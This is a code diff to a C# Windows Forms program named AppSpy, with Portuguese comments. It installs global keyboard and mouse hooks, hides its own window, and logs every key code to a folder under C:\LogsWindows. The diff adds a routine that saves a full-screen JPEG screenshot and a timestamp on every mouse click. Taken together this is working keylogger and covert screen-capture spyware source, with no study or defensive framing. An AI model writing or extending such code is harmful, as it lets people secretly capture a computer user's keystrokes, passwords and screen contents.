@@ -4,6 +4,7 @@ using System.ComponentModel;
 using System.Data;
 using System.Diagnostics;
 using System.Drawing;
+using System.Drawing.Imaging;
 using System.IO;
 using System.Linq;
 using System.Net;
@@ -18,9 +19,8 @@ namespace AppSpy
     public partial class Form1 : Form
     {
         MouseHook mouseHook = new MouseHook();
-        KeyboardHook keyboardHook = new KeyboardHook();
 
-        KeyBordHook teste = new KeyBordHook();
+        KeyBordHook keyboardHook = new KeyBordHook();
 
         string folder = @"C:\LogsWindows"; //nome do diretorio a ser criado
         string textoCapturado = "";
@@ -32,21 +32,12 @@ namespace AppSpy
 
         private void Form1_Load(object sender, EventArgs e)
         {
-            mouseHook.MouseMove += new MouseEventHandler(mouseHook_MouseMove);
-            mouseHook.MouseDown += new MouseEventHandler(mouseHook_MouseDown);
-            mouseHook.MouseUp += new MouseEventHandler(mouseHook_MouseUp);
-            mouseHook.MouseWheel += new MouseEventHandler(mouseHook_MouseWheel);
 
-            keyboardHook.KeyDown += new KeyEventHandler(keyboardHook_KeyDown);
-            keyboardHook.KeyUp += new KeyEventHandler(keyboardHook_KeyUp);
-            keyboardHook.KeyPress += new KeyPressEventHandler(keyboardHook_KeyPress);
+            mouseHook.MouseDown += new MouseEventHandler(mouseHook_MouseDown);
+            keyboardHook.OnKeyDownEvent += KeyBoard_OnKeyDownEvent;
 
             mouseHook.Start();
             keyboardHook.Start();
-
-            teste.OnKeyDownEvent += Teste_OnKeyDownEvent;
-
-            teste.Start();
 
             //Se o diretório não existir...
             if (!Directory.Exists(folder))
@@ -57,123 +48,49 @@ namespace AppSpy
 
         }
 
-        private void Teste_OnKeyDownEvent(object sender, KeyEventArgs e)
-        {
-            Salva_Texto_Capturado(e.KeyCode.ToString());
-        }
-
         private void Form1_Shown(object sender, EventArgs e)
         {
             this.Hide();
         }
 
-        #region Eventos Mouse e teclado
-
-        void keyboardHook_KeyPress(object sender, KeyPressEventArgs e)
+        private void KeyBoard_OnKeyDownEvent(object sender, KeyEventArgs e)
         {
-
-            KeyboardEvent(
-                "KeyPress",
-                "",
-                e.KeyChar.ToString(),
-                "",
-                "",
-                ""
-                );
-
-             //Salva_Texto_Capturado(e.KeyChar.ToString());
-
-        }
-
-        void keyboardHook_KeyUp(object sender, KeyEventArgs e)
-        {
-
-            KeyboardEvent(
-                "KeyUp",
-                e.KeyCode.ToString(),
-                "",
-                e.Shift.ToString(),
-                e.Alt.ToString(),
-                e.Control.ToString()
-                );
-
-        }
-
-        void keyboardHook_KeyDown(object sender, KeyEventArgs e)
-        {
-
-
-            KeyboardEvent(
-                "KeyDown",
-                e.KeyCode.ToString(),
-                "",
-                e.Shift.ToString(),
-                e.Alt.ToString(),
-                e.Control.ToString()
-                );
-
-        }
-
-        void mouseHook_MouseWheel(object sender, MouseEventArgs e)
-        {
-
-            MouseEvent(
-                "MouseWheel",
-                "",
-                "",
-                "",
-                e.Delta.ToString()
-                );
-
-        }
-
-        void mouseHook_MouseUp(object sender, MouseEventArgs e)
-        {
-
-
-            MouseEvent(
-                "MouseUp",
-                e.Button.ToString(),
-                e.X.ToString(),
-                e.Y.ToString(),
-                ""
-                );
-
+            Salva_Texto_Capturado(e.KeyCode.ToString());
         }
 
         void mouseHook_MouseDown(object sender, MouseEventArgs e)
         {
+            PrintScreen();
 
+            StreamWriter w;
 
-            MouseEvent(
-                "MouseDown",
-                e.Button.ToString(),
-                e.X.ToString(),
-                e.Y.ToString(),
-                ""
-                );
-
+            using (w = System.IO.File.AppendText(folder + "\\LogUpdate.txt"))
+            {
+                w.WriteLine(DateTime.Now.Day.ToString() + "_"
+                + DateTime.Now.Month.ToString() + "_"
+                + DateTime.Now.Year.ToString() + "_"
+                + DateTime.Now.Hour.ToString() + "_"
+                + DateTime.Now.Minute.ToString() + "_"
+                + DateTime.Now.Second.ToString() + "_"
+                + DateTime.Now.Millisecond.ToString());
+            }
         }
 
-        void mouseHook_MouseMove(object sender, MouseEventArgs e)
+        private void PrintScreen()
         {
-
-
+            Bitmap printscreen = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
+            Graphics graphics = Graphics.FromImage(printscreen as Image);
+            graphics.CopyFromScreen(0, 0, 0, 0, printscreen.Size); //Copia a imagem da tela
+            printscreen.Save(folder + "\\"
+                + DateTime.Now.Day.ToString() + "_"
+                + DateTime.Now.Month.ToString() + "_"
+                + DateTime.Now.Year.ToString() + "_"
+                + DateTime.Now.Hour.ToString() + "_"
+                + DateTime.Now.Minute.ToString() + "_"
+                + DateTime.Now.Second.ToString() + "_"
+                + DateTime.Now.Millisecond.ToString() + ".jpg", ImageFormat.Jpeg); //Salva a captura de tela
         }
 
-        #endregion
-
-        void MouseEvent(string eventType, string button, string x, string y, string delta)
-        {
-
-
-        }
-
-        void KeyboardEvent(string eventType, string keyCode, string keyChar, string shift, string alt, string control)
-        {
-            
-
-        }
 
         private void Salva_Texto_Capturado(string text)
         {
@@ -199,7 +116,7 @@ namespace AppSpy
 
         private void Form1_FormClosing(object sender, FormClosingEventArgs e)
         {
-            teste.Stop();
+            //teste.Stop();
         }
     }
 
